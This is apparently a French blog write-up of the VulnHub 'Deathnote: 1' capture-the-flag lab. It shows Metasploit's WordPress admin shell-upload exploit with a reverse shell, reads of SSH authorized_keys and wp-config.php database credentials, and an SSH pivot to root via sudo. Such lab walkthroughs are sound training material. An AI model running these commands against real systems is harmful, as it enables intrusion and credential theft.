<!DOCTYPE html>
<html data-html-server-rendered="true" lang="fr" data-vue-tag="%7B%22lang%22:%7B%22ssr%22:%22fr%22%7D%7D">
  <head>
    <title>CTF Deathnote: 1 - https://etienner.github.io</title><meta name="gridsome:hash" content="e9e710b63b02d049a9f8a5359c5c22618737fe2f"><meta data-vue-tag="ssr" charset="utf-8"><meta data-vue-tag="ssr" name="generator" content="Gridsome v0.7.14"><meta data-vue-tag="ssr" data-key="viewport" name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover"><meta data-vue-tag="ssr" data-key="format-detection" name="format-detection" content="telephone=no"><meta data-vue-tag="ssr" name="description" content="Avant propos
Le d√©roul√© de ce hack a √©t√© r√©alis√© sur une machine pr√©vue √† cette effet. Il est interdit de mener ce genre d&#x27;action sur une machine qui ne vous appartient pas sans l&#x27;accord de son ou sa"><meta data-vue-tag="ssr" property="og:type" content="article"><meta data-vue-tag="ssr" property="og:title" content="CTF Deathnote: 1"><meta data-vue-tag="ssr" property="og:description" content="Avant propos
Le d√©roul√© de ce hack a √©t√© r√©alis√© sur une machine pr√©vue √† cette effet. Il est interdit de mener ce genre d&#x27;action sur une machine qui ne vous appartient pas sans l&#x27;accord de son ou sa"><meta data-vue-tag="ssr" property="og:url" content="https://etienner.github.io/ctf-deathnote-1/"><meta data-vue-tag="ssr" name="twitter:domain" content="https://etienner.github.io"><meta data-vue-tag="ssr" name="twitter:card" content="summary_large_image"><meta data-vue-tag="ssr" name="twitter:title" content="CTF Deathnote: 1"><meta data-vue-tag="ssr" name="twitter:description" content="Avant propos
Le d√©roul√© de ce hack a √©t√© r√©alis√© sur une machine pr√©vue √† cette effet. Il est interdit de mener ce genre d&#x27;action sur une machine qui ne vous appartient pas sans l&#x27;accord de son ou sa"><meta data-vue-tag="ssr" name="twitter:site" content="@etiennerouzeaud"><meta data-vue-tag="ssr" name="twitter:creator" content="@etiennerouzeaud"><link data-vue-tag="ssr" rel="icon" href="data:,"><link data-vue-tag="ssr" rel="icon" type="image/png" sizes="16x16" href="/assets/static/favicon.ce0531f.9bb7ffafafc09ac851d81afb65b8ef59.png"><link data-vue-tag="ssr" rel="icon" type="image/png" sizes="32x32" href="/assets/static/favicon.ac8d93a.9bb7ffafafc09ac851d81afb65b8ef59.png"><link data-vue-tag="ssr" rel="icon" type="image/png" sizes="96x96" href="/assets/static/favicon.b9532cc.9bb7ffafafc09ac851d81afb65b8ef59.png"><link data-vue-tag="ssr" rel="apple-touch-icon" type="image/png" sizes="76x76" href="/assets/static/favicon.f22e9f3.9bb7ffafafc09ac851d81afb65b8ef59.png"><link data-vue-tag="ssr" rel="apple-touch-icon" type="image/png" sizes="152x152" href="/assets/static/favicon.62d22cb.9bb7ffafafc09ac851d81afb65b8ef59.png"><link data-vue-tag="ssr" rel="apple-touch-icon" type="image/png" sizes="120x120" href="/assets/static/favicon.1539b60.9bb7ffafafc09ac851d81afb65b8ef59.png"><link data-vue-tag="ssr" rel="apple-touch-icon" type="image/png" sizes="167x167" href="/assets/static/favicon.dc0cdc5.9bb7ffafafc09ac851d81afb65b8ef59.png"><link data-vue-tag="ssr" rel="apple-touch-icon" type="image/png" sizes="180x180" href="/assets/static/favicon.7b22250.9bb7ffafafc09ac851d81afb65b8ef59.png"><link rel="preload" href="/assets/css/0.styles.a80f6262.css" as="style"><link rel="preload" href="/assets/js/app.8917d561.js" as="script"><link rel="preload" href="/assets/js/page--src-templates-post-vue.93f54eeb.js" as="script"><link rel="prefetch" href="/assets/js/page--node-modules-gridsome-app-pages-404-vue.5bf39404.js"><link rel="prefetch" href="/assets/js/page--src-pages-index-vue.1fdd30a3.js"><link rel="prefetch" href="/assets/js/page--src-templates-tag-vue.8311241e.js"><link rel="stylesheet" href="/assets/css/0.styles.a80f6262.css"><noscript data-vue-tag="ssr"><style>.g-image--loading{display:none;}</style></noscript>
  </head>
  <body >
    <div data-server-rendered="true" id="app"><header class="py-2 text-center"><strong><a href="/" title="Accueil" class="active">Etienne ROUZEAUD - D√©veloppeur Web</a></strong></header><main><div class="title py-2 text-center" data-v-4b217994><h1 class="display-5 pt-2" data-v-4b217994>CTF Deathnote: 1</h1><!----></div><div class="container"><div class="row sidebar"><div class="mt-4 col-lg-2"><p><em><span>13 septembre 2021</span></em></p><ul class="list-unstyled"><li>
            üè∑Ô∏è <a href="/tag/Pentest/">Pentest</a></li><li>
            üè∑Ô∏è <a href="/tag/CTF/">CTF</a></li></ul><p>‚åö 5 mins de lecture</p><p><a href="https://www.vulnhub.com/entry/deathnote-1,739" target="_blank" rel="noopener">
            üíæ T√©l√©chargement
          </a></p></div><div class="col-lg-10 mt-4"><!----><article><h2>Avant propos</h2>
<p>Le d√©roul√© de ce hack a √©t√© r√©alis√© sur une machine pr√©vue √† cette effet. Il est interdit de mener ce genre d'action sur une machine qui ne vous appartient pas sans l'accord de son ou sa propri√©taire.<br>
Ce CTF a √©t√© r√©alis√© avec une machine attaquante <strong>Kali 2021.2</strong> (<code class="language-text">lsb_release -r</code>).</p>
<h2>Enum√©ration</h2>
<p>On r√©cup√®re l'adresse IP de la machine distante avec <strong>Netdiscover</strong> <code class="language-text">sudo netdiscover</code>.<br>
Avant de poursuivre, on exporte cette adresse dans une variable pour √™tre tranquille par la suite <code class="language-text">export IP=192.168.1.19</code>.<br>
Puis on cr√©√© un dossier d√©di√© √† ce CTF <code class="language-text">cd Documents/ctf &amp;&amp; mkdir Deathnote1 &amp;&amp; cd Deathnote1</code>.<br>
On lance <strong>Nmap</strong> pour scanner les ports de la machine distante.</p>
<div class="gridsome-highlight" data-language="bash"><pre style="counter-reset: linenumber NaN" class="language-bash line-numbers"><code class="language-bash">$ nmap -sV -sT -p- <span class="token variable">$IP</span> -oN nmap.txt
PORT   STATE SERVICE VERSION
<span class="token number">22</span>/tcp <span class="token function">open</span>  <span class="token function">ssh</span>     OpenSSH <span class="token number">7</span>.9p1 Debian <span class="token number">10</span>+deb10u2 <span class="token punctuation">(</span>protocol <span class="token number">2.0</span><span class="token punctuation">)</span>
<span class="token number">80</span>/tcp <span class="token function">open</span>  http    Apache httpd <span class="token number">2.4</span>.38 <span class="token variable"><span class="token punctuation">((</span>Debian<span class="token punctuation">))</span></span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span></span></pre></div>
<p>On un serveur <strong>SSH</strong> sur le port <strong>22</strong> et un serveur Apache 2.4.38 sur le port <strong>80</strong>.</p>
<p>En voulant acc√©der au site, on peut constater qu'il faut modifier le fichier <strong>hosts</strong> pour lui assigner le domaine "deathnote.vuln".</p>
<div class="gridsome-highlight" data-language="bash"><pre style="counter-reset: linenumber NaN" class="language-bash line-numbers"><code class="language-bash">$ <span class="token function">sudo</span> <span class="token function">vim</span> /etc/hosts
<span class="token number">192.168</span>.1.19    deathnote.vuln</code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span></span></pre></div>
<p>Sur la page <strong>Wordpress</strong>, on voit que c'est l'utilisateur "kira" qui a r√©dig√© l'article et en scrollant, on tombe sur ce message "my fav line is iamjustic3". Sur la page de login <a href="http://deathnote.vuln/wordpress/wp-login.php" target="_blank" rel="nofollow noopener noreferrer">http://deathnote.vuln/wordpress/wp-login.php</a>, on rentre "kira" et le mot de passe, par d√©duction "iamjustic3".</p>
<h2>P√©n√©tration</h2>
<p>Pour se connecter √† la machine, on peut utiliser l'outil <strong>metasploit</strong> pour lancer l'exploit "wp_admin_shell_upload" qui va ex√©cuter un reverse shell.</p>
<div class="gridsome-highlight" data-language="bash"><pre style="counter-reset: linenumber NaN" class="language-bash line-numbers"><code class="language-bash">$ msfconsole
msf6 <span class="token operator">></span> use exploit/unix/webapp/wp_admin_shell_upload
msf6 exploit<span class="token punctuation">(</span>unix/webapp/wp_admin_shell_upload<span class="token punctuation">)</span> <span class="token operator">></span> show options</code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span></span></pre></div>
<p>On renseigne l'adresse de destination.</p>
<div class="gridsome-highlight" data-language="bash"><pre style="counter-reset: linenumber NaN" class="language-bash line-numbers"><code class="language-bash">msf6 exploit<span class="token punctuation">(</span>unix/webapp/wp_admin_shell_upload<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token builtin class-name">set</span> RHOSTS <span class="token number">192.168</span>.1.19
RHOSTS <span class="token operator">=</span><span class="token operator">></span> <span class="token number">192.168</span>.1.19</code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span></span></pre></div>
<p>Puis le chemin de <strong>Wordpress</strong>.</p>
<div class="gridsome-highlight" data-language="bash"><pre style="counter-reset: linenumber NaN" class="language-bash line-numbers"><code class="language-bash">msf6 exploit<span class="token punctuation">(</span>unix/webapp/wp_admin_shell_upload<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token builtin class-name">set</span> TARGETURI /wordpress
TARGETURI <span class="token operator">=</span><span class="token operator">></span> /wordpress</code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span></span></pre></div>
<p>Puis le nom de l'utilisateur.</p>
<div class="gridsome-highlight" data-language="bash"><pre style="counter-reset: linenumber NaN" class="language-bash line-numbers"><code class="language-bash">msf6 exploit<span class="token punctuation">(</span>unix/webapp/wp_admin_shell_upload<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token builtin class-name">set</span> USERNAME kira
USERNAME <span class="token operator">=</span><span class="token operator">></span> kira</code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span></span></pre></div>
<p>Puis le mot de passe.</p>
<div class="gridsome-highlight" data-language="bash"><pre style="counter-reset: linenumber NaN" class="language-bash line-numbers"><code class="language-bash">msf6 exploit<span class="token punctuation">(</span>unix/webapp/wp_admin_shell_upload<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token builtin class-name">set</span> PASSWORD iamjustic3
PASSWORD <span class="token operator">=</span><span class="token operator">></span> iamjustic3</code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span></span></pre></div>
<p>Et on lance l'exploit.</p>
<div class="gridsome-highlight" data-language="bash"><pre style="counter-reset: linenumber NaN" class="language-bash line-numbers"><code class="language-bash">msf6 exploit<span class="token punctuation">(</span>unix/webapp/wp_admin_shell_upload<span class="token punctuation">)</span> <span class="token operator">></span> run</code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span></span></pre></div>
<p>Le script s'ex√©cute correctement. On est connect√© au serveur.</p>
<div class="gridsome-highlight" data-language="bash"><pre style="counter-reset: linenumber NaN" class="language-bash line-numbers"><code class="language-bash">$ meterpreter <span class="token operator">></span> shell
python -c <span class="token string">'import pty; pty.spawn("/bin/sh")'</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span></span></pre></div>
<p>On trouve un fichier avec du <strong>brainfuck</strong> dans le r√©pertoire de l'utilisateur "l".</p>
<div class="gridsome-highlight" data-language="bash"><pre style="counter-reset: linenumber NaN" class="language-bash line-numbers"><code class="language-bash">$ <span class="token function">cat</span> /home/l/user.txt
++++++++++<span class="token punctuation">[</span><span class="token operator">></span>+<span class="token operator">></span>+++<span class="token operator">></span>+++++++<span class="token operator">></span>++++++++++<span class="token operator">&lt;&lt;&lt;</span><span class="token operator">&lt;</span>-<span class="token punctuation">]</span><span class="token operator">>></span><span class="token operator">>></span>+++++.<span class="token operator">&lt;&lt;</span>++.<span class="token operator">>></span>+++++++++++.------------.+.+++++.---.<span class="token operator">&lt;&lt;</span>.<span class="token operator">>></span>++++++++++.<span class="token operator">&lt;&lt;</span>.<span class="token operator">>></span>--------------.++++++++.+++++.<span class="token operator">&lt;&lt;</span>.<span class="token operator">>></span>.------------.---.<span class="token operator">&lt;&lt;</span>.<span class="token operator">>></span>++++++++++++++.-----------.---.+++++++<span class="token punctuation">..</span><span class="token operator">&lt;&lt;</span>.++++++++++++.------------.<span class="token operator">>></span>----------.+++++++++++++++++++.-.<span class="token operator">&lt;&lt;</span>.<span class="token operator">>></span>+++++.----------.++++++.<span class="token operator">&lt;&lt;</span>.<span class="token operator">>></span>++.--------.-.++++++.<span class="token operator">&lt;&lt;</span>.<span class="token operator">>></span>------------------.+++.<span class="token operator">&lt;&lt;</span>.<span class="token operator">>></span>----.+.++++++++++.-------.<span class="token operator">&lt;&lt;</span>.<span class="token operator">>></span>+++++++++++++++.-----.<span class="token operator">&lt;&lt;</span>.<span class="token operator">>></span>----.--.+++<span class="token punctuation">..</span><span class="token operator">&lt;&lt;</span>.<span class="token operator">>></span>+.--------.<span class="token operator">&lt;&lt;</span>.+++++++++++++.<span class="token operator">>></span>++++++.--.+++++++++.-----------------.</code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span></span></pre></div>
<p>"i think u got the shell , but you wont be able to kill me -kira". De toute √©vidence, c'est une fausse piste.</p>
<p>En consultant le r√©pertoire de l'utilisateur "kira", on trouve une info int√©ressante.</p>
<div class="gridsome-highlight" data-language="bash"><pre style="counter-reset: linenumber NaN" class="language-bash line-numbers"><code class="language-bash">$ <span class="token function">cat</span> /home/kira/.ssh/authorized_keys
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDyiW87OWKrV0KW13eKWJir58hT8IbC6Z61SZNh4Yzm9XlfTcCytDH56uhDOqtMR6jVzs9qCSXGQFLhc6IMPF69YMiK9yTU5ahT8LmfO0ObqSfSAGHaS0i5A73pxlqUTHHrzhB3/Jy93n0NfPqOX7HGkLBasYR0v/IreR74iiBI0JseDxyrZCLcl6h9V0WiU0mjbPNBGOffz41CJN78y2YXBuUliOAj/6vBi+wMyFF3jQhP4Su72ssLH1n/E2HBimD0F75mi6LE9SNuI6NivbJUWZFrfbQhN2FSsIHnuoLIJQfuFZsQtJsBQ9d3yvTD2k/POyhURC6MW0V/aQICFZ6z l@deathnote</code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span></span></pre></div>
<p>Cela signifie que l'utilisateur "l" est enregistr√© dans <strong>SSH</strong> pour se connecter au compte de "kira".</p>
<p>On retrouve le mot de passe de l'utilisateur "l" dans le fichier de configuration de <strong>Wordpress</strong>.</p>
<div class="gridsome-highlight" data-language="bash"><pre style="counter-reset: linenumber NaN" class="language-bash line-numbers"><code class="language-bash">$ <span class="token function">cat</span> /var/www/deathnote.vuln/wordpress/wp-config.php
/** MySQL database username */
define<span class="token punctuation">(</span> <span class="token string">'DB_USER'</span>, <span class="token string">'l'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>

/** MySQL database password */
define<span class="token punctuation">(</span> <span class="token string">'DB_PASSWORD'</span>, <span class="token string">'death4me'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<p>On peut d√©sormais se connecter avec cet utilisateur.</p>
<div class="gridsome-highlight" data-language="bash"><pre style="counter-reset: linenumber NaN" class="language-bash line-numbers"><code class="language-bash"><span class="token function">ssh</span> l@<span class="token variable">$IP</span>
l@192.168.1.19's password: death4me</code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span></span></pre></div>
<h2>Escalation</h2>
<p>Puis se connecter avec le compte "kira" sans sp√©cifier de mot de passe.</p>
<div class="gridsome-highlight" data-language="bash"><pre style="counter-reset: linenumber NaN" class="language-bash line-numbers"><code class="language-bash">$ <span class="token function">ssh</span> kira@localhost
$ <span class="token function">id</span>
<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">1001</span><span class="token punctuation">(</span>kira<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">1001</span><span class="token punctuation">(</span>kira<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">1001</span><span class="token punctuation">(</span>kira<span class="token punctuation">)</span>,27<span class="token punctuation">(</span>sudo<span class="token punctuation">)</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span></span></pre></div>
<p>On trouve le premier flag.</p>
<div class="gridsome-highlight" data-language="bash"><pre style="counter-reset: linenumber NaN" class="language-bash line-numbers"><code class="language-bash">$ <span class="token function">cat</span> kira.txt
cGxlYXNlIHByb3RlY3Qgb25lIG9mIHRoZSBmb2xsb3dpbmcgCjEuIEwgKC9vcHQpCjIuIE1pc2EgKC92YXIp</code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span></span></pre></div>
<p>En farvouillant partout, on trouve dans le r√©pertoire "/opt", un dossier "L" avec un indice</p>
<div class="gridsome-highlight" data-language="bash"><pre style="counter-reset: linenumber NaN" class="language-bash line-numbers"><code class="language-bash">$ <span class="token function">cat</span> /opt/L/fake-notebook-rule/hint
use cyberchef</code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span></span></pre></div>
<p>Puis on consulte le fichier concern√©.</p>
<div class="gridsome-highlight" data-language="bash"><pre style="counter-reset: linenumber NaN" class="language-bash line-numbers"><code class="language-bash">$ <span class="token function">cat</span> /opt/L/fake-notebook-rule/case.wav
<span class="token number">63</span> <span class="token number">47</span> <span class="token number">46</span> 7a <span class="token number">63</span> <span class="token number">33</span> <span class="token number">64</span> 6b <span class="token number">49</span> <span class="token number">44</span> 6f <span class="token number">67</span> <span class="token number">61</span> <span class="token number">32</span> 6c <span class="token number">79</span> <span class="token number">59</span> <span class="token number">57</span> 6c 7a 5a <span class="token number">58</span> 5a <span class="token number">70</span> <span class="token number">62</span> <span class="token number">43</span> <span class="token number">41</span> 3d</code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span></span></pre></div>
<p>Sur <a href="https://gchq.github.io/CyberChef/" target="_blank" rel="nofollow noopener noreferrer">cyberchef</a>, en d√©codant cette chaine hexad√©cimal, on trouve la valeur en <strong>Base64</strong> <code class="language-text">cGFzc3dkIDoga2lyYWlzZXZpbCA=</code> que l'on d√©code avec la ligne de commande ci-dessous.</p>
<div class="gridsome-highlight" data-language="bash"><pre style="counter-reset: linenumber NaN" class="language-bash line-numbers"><code class="language-bash">$ <span class="token builtin class-name">echo</span> <span class="token string">'cGFzc3dkIDoga2lyYWlzZXZpbCA='</span> <span class="token operator">|</span> base64 -d
<span class="token function">passwd</span> <span class="token builtin class-name">:</span> kiraisevil</code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span></span></pre></div>
<p>On a bien le mot de passe de l'utilisateur donc on peut consulter ses privil√®ges.</p>
<div class="gridsome-highlight" data-language="bash"><pre style="counter-reset: linenumber NaN" class="language-bash line-numbers"><code class="language-bash">$ <span class="token function">sudo</span> -l
<span class="token punctuation">[</span>sudo<span class="token punctuation">]</span> password <span class="token keyword">for</span> kira: 
Matching Defaults entries <span class="token keyword">for</span> kira on deathnote:
    env_reset, mail_badpass, <span class="token assign-left variable">secure_path</span><span class="token operator">=</span>/usr/local/sbin<span class="token punctuation">\</span>:/usr/local/bin<span class="token punctuation">\</span>:/usr/sbin<span class="token punctuation">\</span>:/usr/bin<span class="token punctuation">\</span>:/sbin<span class="token punctuation">\</span>:/bin

User kira may run the following commands on deathnote:
    <span class="token punctuation">(</span>ALL <span class="token builtin class-name">:</span> ALL<span class="token punctuation">)</span> ALL</code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<p>L'utilisateur a tous les droits.</p>
<div class="gridsome-highlight" data-language="bash"><pre style="counter-reset: linenumber NaN" class="language-bash line-numbers"><code class="language-bash">$ <span class="token function">sudo</span> <span class="token function">bash</span>
$ <span class="token function">id</span>
<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span>
$ <span class="token function">cat</span> /root/root.txt</code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span></span></pre></div>
<h2>Pr√©ambule</h2>
<p>Il existait une autre voie lors de l'√©num√©ration pour trouver le mot de passe de l'utilisateur "l". En effet, dans les fichiers d'upload, il y a un fichier contenant une liste de mots de passe √† l'adresse suivante <a href="http://deathnote.vuln/wordpress/wp-content/uploads/2021/07/notes.txt" target="_blank" rel="nofollow noopener noreferrer">http://deathnote.vuln/wordpress/wp-content/uploads/2021/07/notes.txt</a>. Ainsi, on aurait pu retrouver le mot de passe via l'outil de brute force <strong>Hydra</strong>.</p>
</article></div></div></div></main><footer class="text-white mt-4"><ul class="nav nav-pills justify-content-center"><li><a href="https://github.com/etienner" target="_blank" rel="noopener" class="nav-link">Github</a></li><li><a href="https://medium.com/@etiennerouzeaud" target="_blank" rel="noopener" class="nav-link">Medium</a></li><li><a href="https://twitter.com/etiennerouzeaud" target="_blank" rel="noopener" class="nav-link">Twitter</a></li></ul></footer></div>
    <script>window.__INITIAL_STATE__={"data":{"post":{"title":"CTF Deathnote: 1","date":"13 September 2021","content":"\u003Ch2\u003EAvant propos\u003C\u002Fh2\u003E\n\u003Cp\u003ELe d√©roul√© de ce hack a √©t√© r√©alis√© sur une machine pr√©vue √† cette effet. Il est interdit de mener ce genre d'action sur une machine qui ne vous appartient pas sans l'accord de son ou sa propri√©taire.\u003Cbr\u003E\nCe CTF a √©t√© r√©alis√© avec une machine attaquante \u003Cstrong\u003EKali 2021.2\u003C\u002Fstrong\u003E (\u003Ccode class=\"language-text\"\u003Elsb_release -r\u003C\u002Fcode\u003E).\u003C\u002Fp\u003E\n\u003Ch2\u003EEnum√©ration\u003C\u002Fh2\u003E\n\u003Cp\u003EOn r√©cup√®re l'adresse IP de la machine distante avec \u003Cstrong\u003ENetdiscover\u003C\u002Fstrong\u003E \u003Ccode class=\"language-text\"\u003Esudo netdiscover\u003C\u002Fcode\u003E.\u003Cbr\u003E\nAvant de poursuivre, on exporte cette adresse dans une variable pour √™tre tranquille par la suite \u003Ccode class=\"language-text\"\u003Eexport IP=192.168.1.19\u003C\u002Fcode\u003E.\u003Cbr\u003E\nPuis on cr√©√© un dossier d√©di√© √† ce CTF \u003Ccode class=\"language-text\"\u003Ecd Documents\u002Fctf &amp;&amp; mkdir Deathnote1 &amp;&amp; cd Deathnote1\u003C\u002Fcode\u003E.\u003Cbr\u003E\nOn lance \u003Cstrong\u003ENmap\u003C\u002Fstrong\u003E pour scanner les ports de la machine distante.\u003C\u002Fp\u003E\n\u003Cdiv class=\"gridsome-highlight\" data-language=\"bash\"\u003E\u003Cpre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"\u003E\u003Ccode class=\"language-bash\"\u003E$ nmap -sV -sT -p- \u003Cspan class=\"token variable\"\u003E$IP\u003C\u002Fspan\u003E -oN nmap.txt\nPORT   STATE SERVICE VERSION\n\u003Cspan class=\"token number\"\u003E22\u003C\u002Fspan\u003E\u002Ftcp \u003Cspan class=\"token function\"\u003Eopen\u003C\u002Fspan\u003E  \u003Cspan class=\"token function\"\u003Essh\u003C\u002Fspan\u003E     OpenSSH \u003Cspan class=\"token number\"\u003E7\u003C\u002Fspan\u003E.9p1 Debian \u003Cspan class=\"token number\"\u003E10\u003C\u002Fspan\u003E+deb10u2 \u003Cspan class=\"token punctuation\"\u003E(\u003C\u002Fspan\u003Eprotocol \u003Cspan class=\"token number\"\u003E2.0\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E)\u003C\u002Fspan\u003E\n\u003Cspan class=\"token number\"\u003E80\u003C\u002Fspan\u003E\u002Ftcp \u003Cspan class=\"token function\"\u003Eopen\u003C\u002Fspan\u003E  http    Apache httpd \u003Cspan class=\"token number\"\u003E2.4\u003C\u002Fspan\u003E.38 \u003Cspan class=\"token variable\"\u003E\u003Cspan class=\"token punctuation\"\u003E((\u003C\u002Fspan\u003EDebian\u003Cspan class=\"token punctuation\"\u003E))\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fcode\u003E\u003Cspan aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fpre\u003E\u003C\u002Fdiv\u003E\n\u003Cp\u003EOn un serveur \u003Cstrong\u003ESSH\u003C\u002Fstrong\u003E sur le port \u003Cstrong\u003E22\u003C\u002Fstrong\u003E et un serveur Apache 2.4.38 sur le port \u003Cstrong\u003E80\u003C\u002Fstrong\u003E.\u003C\u002Fp\u003E\n\u003Cp\u003EEn voulant acc√©der au site, on peut constater qu'il faut modifier le fichier \u003Cstrong\u003Ehosts\u003C\u002Fstrong\u003E pour lui assigner le domaine \"deathnote.vuln\".\u003C\u002Fp\u003E\n\u003Cdiv class=\"gridsome-highlight\" data-language=\"bash\"\u003E\u003Cpre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"\u003E\u003Ccode class=\"language-bash\"\u003E$ \u003Cspan class=\"token function\"\u003Esudo\u003C\u002Fspan\u003E \u003Cspan class=\"token function\"\u003Evim\u003C\u002Fspan\u003E \u002Fetc\u002Fhosts\n\u003Cspan class=\"token number\"\u003E192.168\u003C\u002Fspan\u003E.1.19    deathnote.vuln\u003C\u002Fcode\u003E\u003Cspan aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fpre\u003E\u003C\u002Fdiv\u003E\n\u003Cp\u003ESur la page \u003Cstrong\u003EWordpress\u003C\u002Fstrong\u003E, on voit que c'est l'utilisateur \"kira\" qui a r√©dig√© l'article et en scrollant, on tombe sur ce message \"my fav line is iamjustic3\". Sur la page de login \u003Ca href=\"http:\u002F\u002Fdeathnote.vuln\u002Fwordpress\u002Fwp-login.php\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003Ehttp:\u002F\u002Fdeathnote.vuln\u002Fwordpress\u002Fwp-login.php\u003C\u002Fa\u003E, on rentre \"kira\" et le mot de passe, par d√©duction \"iamjustic3\".\u003C\u002Fp\u003E\n\u003Ch2\u003EP√©n√©tration\u003C\u002Fh2\u003E\n\u003Cp\u003EPour se connecter √† la machine, on peut utiliser l'outil \u003Cstrong\u003Emetasploit\u003C\u002Fstrong\u003E pour lancer l'exploit \"wp_admin_shell_upload\" qui va ex√©cuter un reverse shell.\u003C\u002Fp\u003E\n\u003Cdiv class=\"gridsome-highlight\" data-language=\"bash\"\u003E\u003Cpre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"\u003E\u003Ccode class=\"language-bash\"\u003E$ msfconsole\nmsf6 \u003Cspan class=\"token operator\"\u003E\u003E\u003C\u002Fspan\u003E use exploit\u002Funix\u002Fwebapp\u002Fwp_admin_shell_upload\nmsf6 exploit\u003Cspan class=\"token punctuation\"\u003E(\u003C\u002Fspan\u003Eunix\u002Fwebapp\u002Fwp_admin_shell_upload\u003Cspan class=\"token punctuation\"\u003E)\u003C\u002Fspan\u003E \u003Cspan class=\"token operator\"\u003E\u003E\u003C\u002Fspan\u003E show options\u003C\u002Fcode\u003E\u003Cspan aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fpre\u003E\u003C\u002Fdiv\u003E\n\u003Cp\u003EOn renseigne l'adresse de destination.\u003C\u002Fp\u003E\n\u003Cdiv class=\"gridsome-highlight\" data-language=\"bash\"\u003E\u003Cpre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"\u003E\u003Ccode class=\"language-bash\"\u003Emsf6 exploit\u003Cspan class=\"token punctuation\"\u003E(\u003C\u002Fspan\u003Eunix\u002Fwebapp\u002Fwp_admin_shell_upload\u003Cspan class=\"token punctuation\"\u003E)\u003C\u002Fspan\u003E \u003Cspan class=\"token operator\"\u003E\u003E\u003C\u002Fspan\u003E \u003Cspan class=\"token builtin class-name\"\u003Eset\u003C\u002Fspan\u003E RHOSTS \u003Cspan class=\"token number\"\u003E192.168\u003C\u002Fspan\u003E.1.19\nRHOSTS \u003Cspan class=\"token operator\"\u003E=\u003C\u002Fspan\u003E\u003Cspan class=\"token operator\"\u003E\u003E\u003C\u002Fspan\u003E \u003Cspan class=\"token number\"\u003E192.168\u003C\u002Fspan\u003E.1.19\u003C\u002Fcode\u003E\u003Cspan aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 